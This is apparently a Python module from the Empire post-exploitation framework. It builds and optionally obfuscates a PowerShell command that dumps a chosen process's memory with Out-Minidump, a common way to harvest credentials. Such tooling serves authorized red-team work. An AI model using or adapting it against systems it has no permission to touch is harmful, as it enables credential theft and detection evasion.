from typing import Dict

from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        script_end = ""
        for option, values in params.items():
            if option.lower() != "agent":
                if values and values != "":
                    if option == "ProcessName":
                        script_end = "Get-Process " + values + " | Out-Minidump"
                    elif option == "ProcessId":
                        script_end = "Get-Process -Id " + values + " | Out-Minidump"

        for option, values in params.items():
            if values and values != "":
                if (
                    option != "Agent"
                    and option != "ProcessName"
                    and option != "ProcessId"
                ):
                    script_end += " -" + str(option) + " " + str(values)

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
